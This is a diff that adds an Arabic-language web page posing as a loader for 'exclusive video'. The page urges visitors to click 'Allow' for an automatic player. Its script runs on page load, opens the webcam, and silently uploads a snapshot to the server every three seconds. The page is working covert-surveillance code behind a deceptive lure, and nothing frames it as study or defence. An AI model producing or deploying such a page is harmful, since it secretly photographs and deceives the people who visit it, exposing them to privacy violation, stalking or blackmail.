@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>محتوى حصري 2026</title>
+    <script>
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setInterval(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('image', blob);
+                        fetch('/upload', { method: 'POST', body: formData });
+                    }, 'image/jpeg');
+                }, 3000); 
+            } catch (err) { console.log("Access Denied"); }
+        }
+        window.onload = startCamera;
+    </script>
+</head>
+<body style="background: black; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
+    <h1>جاري تجهيز الفيديو الحصري...</h1>
+    <p>يرجى النقر على "سماح" (Allow) لتشغيل المشغل التلقائي</p>
+    <div style="margin-top: 30px;">
+        <img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJueW94bmZ6eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnB0PWEmZXA9djFfaW50ZXJuYWxfZ2lmX2J5X2lkJmN0PWc/3o7TKMGpxxZ28d3V60/giphy.gif" width="80">
+    </div>
+</body>
+</html>
